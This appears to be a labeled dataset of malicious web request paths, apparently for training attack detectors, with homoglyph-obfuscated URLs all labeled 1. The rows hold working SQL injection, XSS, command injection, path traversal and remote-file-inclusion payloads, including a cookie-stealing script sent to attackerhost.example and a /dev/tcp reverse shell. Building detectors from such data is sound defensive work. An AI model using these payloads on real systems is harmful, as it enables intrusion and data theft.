sentences 	 labels
/ 𝗌𝓉ring / strings / parameters = ' print (  ` echo kkqsra `  .  ` echo  $  (  ( 71 + 76 )  )  `  .  ` echo kkqsra `  .  ` echo kkqsra `  )  ;  # kkqsra  	 1
/ 𝚜𝘵ring / strings / parameters = ( coalesce ( length ( load_file ( 0x2f6574632f706173737764 )  )  , 1 )  )  	 1
/ 𝙞nᏧex . php ? node = system & op = block < script > alert (  " wvs-xss-magic-string-413305588088 "  )  <  / script >  & block = 3 & bop = more  	 1
/ 𝒔𝘁ring / strings / parameters = < div style =  " list-style : url ( http :  /  / foo . f )  \ 20url ( javascript : alert ( 1 )  )  ;  "  > x <  / div >  	 1
/ j𝖺𝔳ascript / dcforum . exe  	 1
/ 𝘀𝔱ring / strings / parameters = 23 or 1 = 1  	 1
/ jɑ𝕧ascript / customers . exe  	 1
/ ꜱ𝚝ring / modo = entrarsessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / attackerhost . example / cgi-bin / cookiesteal . cgi ?  '  + document . cookie <  / s + cript >  ?  & login = sabry & pwd = ce8cuate & remember = off & b1 = entrar  	 1
/ 𝔰𝑡ring / modo = registro <  !  --  # include + file =  " archivo_secreto "  +  --  >  & login = surreau & password = 2u1nt1 & nombre = najla & apellidos = matamalas + reixachs & email = egger . nardo @ quecole . sr & dni = 56569418k & direccion = pl .  + tres + olivos ,  + s / n + 1-f & ciudad = llber & cp = 26321 & provincia = guadalajara & ntc = 5185081374868942 & b1 = registrar  	 1
/ 𝕖хamples / jsp / num / source ? v =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𐑈𝗍ring / strings / parameters = "  |  | echo telpma $  (  ( 31 + 37 )  )  $  ( echo telpma ) telpma  	 1
/ m𝑎𝙞n . php ? stuff =  " ver ;  > q74579968 & rem ;  	 1
/ m𝐚𝔦n . php ? logout =  '  & uname \ x09 > q59435268 \ x09 #  	 1
/ 𝐬𝘤ripts / rest / api / 2 . 0 . alpha1 / serverinfo  	 1
/ 𑣁𝘤ript / menu / menuprincipal . php ? path_inc = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ o𝗱zk𝟐9aa . cgi ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  	 1
/ 𝕤𝘁ring / strings / parameters = admin )  (  |  ( password =  *  )  	 1
/ ١𝟲9okeyj . aspx ?  < script > document . cookie =  " testxeoi = 3573 ;  "  <  / script >  	 1
/ 𝘀𝚝ring / strings / parameters = 1 '  )  )  )  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  (  (  (  ' wuux '  =  ' wuux  	 1
/ 𝙪n𝗮vailable . php ? bibtexrootrel = xxpathxx ?  	 1
/ 𝖋o𝖗um1_professionnel . asp ? n = 1771 & amp ; nn =  /  .  .  .  .  .  .  / boot . ini & amp ; page = 1  	 1
/ 𝔰𝘵ring / strings / parameters = 1 %  '  )  )  and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  --  	 1
/ 𝔰𝙩ring / strings / parameters = "  ;  str =  $  ( echo rnivnr )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ 𝖘𝒕ring / strings / parameters = 1 )  and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ ƽ𝘁ring / strings / parameters = 1 "  "  where 4684 = 4684 union all select null , null , null , null #  	 1
/ 𝐬𝘁ring / strings / parameters = 1 )  )  and 7533 = 7533 and  (  ( 8738 = 8738  	 1
/ 𝖊𝐱amples / jsp / jsp2 / jspx / auktion . cgi ? menue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ n𝘺jƍaorz . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝓼𝖙ring / id = 1 & nombre = ques + o + manchego & precio = 85 & cantidad = 28 & b1 = aadir + al + carrito  	 1
/ 𝖊𝒙amples / jsp / sessions / direct . php ? rf =  / etc / passwd \ x00  	 1
/ 𝓎𝗲f5f3d5 . dll ?  < meta http-equiv = set-cookie content =  " testcrcv = 6167 "  >  	 1
/ zmט𝓺66jy . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝚜𝘵ring / strings / parameters = < script > x =  "  "  >  >  > prompt ( 9 )  >  >  >  "  "  ; y = 42 ;  <  / script >  	 1
/ ꜱ𝗵ops / sub . asp ? isub = dupaypal_sql_injections . nasl '  	 1
/ 𝓼𝘁ring / strings / parameters = 1 "  "  ; iif ( 5257 = 5257 , 1 , 1 / 0 )  	 1
/ 𝗰om𝘱onents / com_joomlaboard / file_upload . php ? sbp = xxpathxx ?  	 1
/ 𝘀𝚝ring / str =  $  ( echo dmzptc )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ 𝕙𝔢lp . php ? q =  & ver  > q48647675 & rem  	 1
/ 𝒅𝟩65w06j . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝓼𝙩ring / modo = registro & login = erh-huan4 & password =  +  & nombre = basiana & apellidos = castany + bigorra & email = balsamo @ chicashumedas . aw & dni = 81192846v & direccion = urbanizacion + santo + domingo + de + la + calzada + 113 + 6h & ciudad = alberguera + de + argan ,  + la & cp = 22760 & provincia = segovia & ntc = 0768342745697395 & b1 = registrar  	 1
/ ꜱ𝗰ripts / lib . inc . php ? pm_path = http :  /  / xxxxxxxx & sfx =  . txt  	 1
/ 𝕤𝓉ring / strings / parameters = 1 '  )  )  as oyad where 7161 = 7161 and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  --  	 1
/ 🯳һlysl2x . asp ?  < meta http-equiv = set-cookie content =  " testgjbe = 8505 "  >  	 1
/ ℎ𝚎lp . php ? q =  ' del q24159687  #  	 1
/ 𝔳ℹew . php ? id = xxpathxx  	 1
/ 𝖘𝔱ring / strings / parameters = '  ;  str =  $  ( echo tabifb )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ 𝓊৪yiqilu . exe ?  < script > document . cookie =  " testswjp = 6010 ;  "  <  / script >  	 1
/ jɑ𝒗ascript / saved . exe  	 1
/ m𝕒n𝐚ger / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  	 1
/ 𝘴𝐭ring / id = 1 & nombre = vino + rioja & precio = 100 /  & cantidad = 19 & b1 = aadir + al + carrito  	 1
/ 𝕤𝚝ring / strings / parameters = "  echo mjvqyb $  (  ( 44 + 28 )  )  $  ( echo mjvqyb ) mjvqyb "  	 1
/ 𝓼𝒕ring / strings / parameters = 1 "  "  )  )  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  (  (  "  " fcpm "  "  =  "  " fcpm  	 1
/ 𝗽𝗵pmyadmin / squirrelcart / cart_content . php ? cart_isp_root =  / etc / passwd \ x00  	 1
/ 𝒕𝓾kodz3j . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝘴𝕥ring / strings / parameters = ;  str =  $  ( echo otxvur )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ ҽ𝒙amples / jsp / checkbox / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login  	 1
/ 𝑠𝙩ring / modo =  ?  & precio = 5969 & b1 = confirmar  	 1
/ 𝔢𝐱amples / jsp / num / webcart . cgi ? config = mountain & change = yes & nextpage =  ; id |  & code = phold  	 1
/ 𝓼𝓽ring / strings / parameters = 1 "  "  )  )  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  (  "  " jydy "  "  like  "  " jydy  	 1
/ 𝒄𝔤i-sys / gw5 / gwweb . exe ? help = bad-request  	 1
/ 𝙝еlp . php ? q =  '  \ x0duname \ x09 > q24981853 \ x09 #  	 1
/ ℮𝖝amples / jsp / num / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  	 1
/ 𝓺𝘩vu0pdg . pl ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  	 1
/ 𝓽ᴡiki / bin / view / main / twikiusers ? rev = 87518  ` 0 <  & 152- ; exec 152 <  >  / dev / tcp / 192 . 168 . 202 . 96 / 22811 ; sh  <  & 152  >  & 152 2 >  & 152 `  #  	 1
/ 𝔰𝚝ring / strings / parameters = -5062 )  where 7457 = 7457 or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  --  	 1
/ 𑣁𝔠s86g1p . htm ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  	 1
/ 𐑈𝓉ring / strings / parameters = 1 )  )  )  ; select case when 7717 = 7717 then 1 else null end --  	 1
/ Ох2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f { file }  	 1
/ j𝟰o𝓆yvga . nsf ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝑠𝔱ring / strings / parameters = '  echo lnvevw $  (  ( 12 + 50 )  )  $  ( echo lnvevw ) lnvevw  	 1
/ 𝕖𝙫entcal2 . php . php ? path_simpnews = xxpathxx  	 1
/ m𝗽𝘤gi / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝘴𝑡ring / strings / parameters = 1 )  )  )  union all select null , null , null , null #  	 1
/ 𐑈𝒕ring / strings / parameters = ;  str =  $  ( echo urvljv )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ 𝐛𝟓xdqgz2 . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝐬𝑡ring / strings / parameters = '  select if ( 1 = 1 ,  ' true '  ,  ' false '  )  	 1
/ Ꮟ𝑦rg33fw . aspx ?  < meta http-equiv = set-cookie content =  " testexuu = 5340 "  >  	 1
/ ꜱ𝒸riptpage / source / includes / load_forum . php ? mfh_root_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  	 1
/ 𝙨𝘁ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo matzok )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ 𝖾𝔁amples / jsp / error / bemarket / shop / index . php ? pageurl = viewpage & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝐬𝒕ring / strings / parameters = < meta http-equiv = set-cookie content =  " testdnbh = 5237 "  >  	 1
/ 𝐟𝙥npp5zg . dll ?  < script > document . cookie =  " testyias = 101 ;  "  <  / script >  	 1
/ 𝗌𝖙ring / strings / parameters = 1 '  )  )  as cimd where 9608 = 9608 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 1
/ ν𝘸mg565s . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝗌𝐭ring / strings / parameters = &  & echo nsdcqt $  (  ( 87 + 20 )  )  $  ( echo nsdcqt ) nsdcqt /  /  	 1
/ l𝟽🯵2x1ry . kspx ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝔰𝒕ring / strings / parameters = < a href =  " javascript \ x0a : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  	 1
/ 𝘴𝗍ring / strings / parameters = &  id  	 1
/ 𝐞n-ʋs / account / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝖛mⅈ8bb12 . dll ?  < meta http-equiv = set-cookie content =  " testlerc = 2575 "  >  	 1
/ 𝙨𝚝ring / strings / parameters = '  |  | echo $ ifstcdxdv $  (  ( 24 + 86 )  )  $  ( echo $ ifstcdxdv ) tcdxdv '  	 1
/ 𝘴𝚝ring / strings / parameters = 1 "  "  )  )  ; select pg_sleep ( 5 )  and  (  (  "  " byhx "  "  like  "  " byhx  	 1
/ 𝖘𝙩ring / strings / parameters = &  & echo $ ifsovpfjy $  (  ( 4 + 71 )  )  $  ( echo $ ifsovpfjy ) ovpfjy '  	 1
/ 𝐡𝟐1y8w52 . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𐑈𝐭ring / strings / parameters = 1 and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  #  couj  	 1
/ 𑣁𝚝ring / strings / parameters = 1 '  ,  ( select  *  from generate_series ( 2636 , 2636 , case when  ( 2636 = 7071 )  then 1 else 0 end )  limit 1 )  	 1
/ m𝐚ⅰn . php ? logout =  '  ; del \ x09q35732238 \ x09 #  	 1
/ 𝘴𝘵ring / strings / parameters = 1 %  "  "  )  )  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ 𝓮𝘅amples / jsp / error / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 410653569 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ m𝘢𝐢n . php ? stuff =  "  & del , q93432438 & rem ,  	 1
/ 𝒔𝔱ring / strings / parameters = x onfocus = alert ( 1 )  >  	 1
/ 𝖘𝘁ring / strings / parameters = -9708 '  where 8150 = 8150 or 6872 = 6872 --  	 1
/ ҽ𝑥amples / jsp / cal / index2 . cgi ? frames = yes & board = demo & mode = current & threads = collapse & message =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝒔𝖙ring / strings / parameters = |   [  6 -ne  $  ( echo ifefqd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ 𝔰𝑡ring / strings / parameters = 1 '  +  ( select ocvc where 6981 = 6981 union all select null , null , null , null , null , null , null , null , null , null #  	 1
/ 𝗊𝒄zkquis . x ?  < script > document . cookie =  " testkwlg = 5591 ;  "  <  / script >  	 1
/ 𝚜𝒕ring / strings / parameters = 1 '  +  ( select  ' qsqs '  where 9227 = 9227 waitfor delay  ' 0 : 0 : 5 '  )  +  '  	 1
/ 𝐬𝗍ring / strings / parameters = 1 "  "  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  (  (  "  " yzjl "  "  like  "  " yzjl  	 1
/ 𝐟𝖕npp5zg . nsf ?  < meta http-equiv = set-cookie content =  " testyias = 101 "  >  	 1
/ 𝖻𝟜vng02k . jsp ?  < script > document . cookie =  " testtrlh = 3672 ;  "  <  / script >  	 1
/ 𝕤𝑡ring / strings / parameters = "  echo $ ifsyqrsaj $  (  ( 55 + 18 )  )  $  ( echo $ ifsyqrsaj ) yqrsaj |  	 1
/ 𝗌𝕥ring / strings / parameters = < div title =  "  %  & gt ;  & lt ;  / script & gt ;  & quot ;  & lt ; img src = 1 onerror = confirm ( 1 )  & gt ;  "  >  <  / div >  	 1
/ 𝘤𝗴ibin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝒔𝘵ring / strings / parameters = 1 "  "  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 1
/ 𝚌𝗴i-bin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1790180624 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ 𝖊𑢬rx3ya4 . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝘀𝓉ring / strings / parameters = |   [  1 -ne  $  ( echo skwmfk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ o𝟞ҽbbirj . dll ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ ꭒn𝗂on avenue - now here ' s union avenue /  	 1
/ 𝓼𝑡ring / strings / parameters = < body onload = alert (  ' crosssitescripting '  )  >  	 1
/ 𝐬𝒕ring / strings / parameters = ;  str =  $  ( echo eekjde )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ ꜱ𝒕ring / strings / parameters = < textarea id = ta >  <  / textarea >  < script > ta . appendchild ( safe123 . parentnode . previoussibling . previoussibling . childnodes [ 3 ]  . firstchild . clonenode ( true )  )  ; confirm ( ta . value . match (  / cookie  =   '  (  .  *  ?  )  '  /  )  [ 1 ]  )  <  / script >  	 1
/ 𐑈𝖙ring / strings / parameters = -1 < img src =  "  " blah >  "  "  onmouseover =  "  " document . cookie = true ;  "  "  >  	 1
/ 𑣁𝘁ring / modo = registro & login = attilla & password = hie4t * i29 & nombre = neyen & apellidos = oll + verdin & email = balfour . riabinkina @ monsur . ls & dni = 7a ' 9417am & direccion = calle + iztueta ,  + 105 +  & ciudad = sant + mart + de + riucorb & cp = 01427 & provincia = salamanca & ntc = 1701163791515432 & b1 = registrar  	 1
/ ⅰnιt . php ? scriptpath = xxpathxx ?  	 1
/ 𝚜𝐜ripts / search . jsp ? q =  %  "  < script > alert ( 1332008323 )  <  / script >  	 1
/ 𝑡𝘩eme / frames1 . php ? root = xxpathxx  	 1
/ 𑣁𝑡ring / modo = entrar & login = maciejew & pwd = de ! senmaraar & remember = on /  & b1 = entrar  	 1
/ 𝒔𝗍ring / modo = entrar & login = carmelo "  + and +  " 1 "  =  " 1 & pwd = precis * a & remember = off & b1 = entrar  	 1
/ 𝘳o𝚝13sj . cgi ?  / etc / passwd  	 1
/ mᒿſpztty . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ m𝘢nаger / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝗁𝐞lp . php ? q =  '  ; rm \ x09q85144243 \ x09 #  	 1
/ 𝒔𝙩ring / strings / parameters = 1 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --  mkoo  	 1
/ ѕ𝒕ring / strings / parameters = .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . etcpasswd  	 1
/ 𝑓ιles / message-replyall . php3 ? bsx_libdir = xxpathxx  	 1
/ 𝖘𝓽ring / modo = registro & login = kahn & password = 0obr4b96876 & nombre = adra & apellidos = fras + gorriz & email = ram-varda @ diagnosticoradiologico . cm & dni = 90321303g & direccion = calle + dona + urraca + 0 ,  +  & ciudad = irurtzun & cp = 24766 & provincia = lava & ntc = 4355943432869477 & b1 =  '  + and +  ' 1 '  =  ' 1  	 1
/ 𝓉o𝑝 . php ? stuff =  "  | ping \ x09-w \ x097000 \ x09-n \ x091 \ x094 . 3 . 2 . 1 | rem \ x09  	 1
/ 𝒆𝙙zaia0i . htm ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝑠𝚝ring / strings / parameters = 1 "  "  )  and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  "  " rrbl "  "  =  "  " rrbl  	 1
/ j𝙖𝒗ascript / nsf . exe  	 1
/ 𝑖nꓒex . php ? madoa = xxpathxx ?  	 1
/ 𝕖𝕩amples / servlets / servlet / edit_image . php ? dn = 1 & userfile =  / etc / passwd & userfile_name =   ; id ;  	 1
/ 𝐞n-ꭎs / n9xlumt5 . htm ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝚜𝚝ring / strings / parameters = echo bajxzz $  (  ( 73 + 7 )  )  $  ( echo bajxzz ) bajxzz "  	 1
/ 𝓼𝔱ring / strings / parameters = '  or 1 = utl_inaddr . get_host_address (  ( select banner from v $ version where rownum = 1 )  )  --  "  	 1
/ 𝕖𝗌mozg5d . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝖘𝙩ring / strings / parameters = |  | echo xytcpc $  (  ( 29 + 30 )  )  $  ( echo xytcpc ) xytcpc /  /  	 1
/ m𝘢𝗂n . php ? stuff = ver \ xa0 > q77895939 & rem \ xa0  	 1
/ 𑜎ꬲq93ppb . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ j𝔞𝗏ascript / buynow . exe  	 1
/ 𝘀𝘵ring / strings / parameters = -7552 or 6872 = 6872  	 1
/ 𝚜𝕥ring / strings / parameters = $  { shell_exec ( print (  ` echo pwwuen `  .  ` echo  $  (  ( 49 + 57 )  )  `  .  ` echo pwwuen `  .  ` echo pwwuen `  )  )  } pwwuen  	 1
/ 𝕤𝖙ring / strings / parameters = -8215 %  "  "  )  union all select 3877 , 3877 , 3877 , 3877 , 3877 , 3877 --  	 1
/ j𝒶𝗏ascript / cars . exe  	 1
/ 𝓈𝘁ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ybjqlf )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 1
/ 𝙝ꬲlp . php ? q =  " ping \ x0b-w \ x0b10000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 | rem \ x0b  	 1
/ ꜱ𝗍ring / modo = insertar & precio = 806 & b1 = confirmar /  	 1
/ 𝚜𝓮rvlet / webacc ? user . html =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝒔𝒕ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo kmqxrc )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 1
/ ʋ𝟫5h6ymu . idc ?  < script > document . cookie =  " testkhwc = 4028 ;  "  <  / script >  	 1
/ ꜱ𝖙ring / strings / parameters = 1 and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  #  rhli  	 1
/ 𝚊𝓪aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file }  	 1
/ 𝔰𝓽ring / strings / parameters = ;  str =  $  ( echo iboovb )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ 𝈒𝒖1pb2xi . mscgi ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  	 1
/ ⅽ𝐠i-bin /  ?  "  >  < script > alert (  ' struts_sa_surl_xss . nasl '  )  <  / script >  	 1
/ е𝔁amples / jsp / sessions / docs / index . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝙚𝘅amples / jsp / error / help . php ? section =  ' qualiteam_xcart_sql_xss . nasl  	 1
/ 𝔀𝓹s / wcm / webinterface / login / login . jsp ?  "  >  < script > alert (  " ibm_login_qs_xss . nasl-1332008334 "  )  <  / script >  	 1
/ jɑ𝗏ascript / computers . exe  	 1
/ ѕ𝚝ring / strings / parameters = <  /  foo =  "  >  < script > alert ( 91 )  <  / script >  "  >  	 1
/ 𝙨ϲripts / search . jsp ? q =  %  "  < script > alert ( 1331908697 )  <  / script >  	 1
/ 𝙚n-𝕦s / 33y9gcqq . aspx ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 1
/ m𝐚n𝘢ger / faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 453988391 , 0 , 0 , 0 , 0 , 0 --  	 1
/ 𝘴𝒕ring / modo = entrar & login =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & pwd = 2esu1ador3 & remember = on & b1 = entrar  	 1
/ 𝕖n-սs / odzk29aa . fts ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  	 1
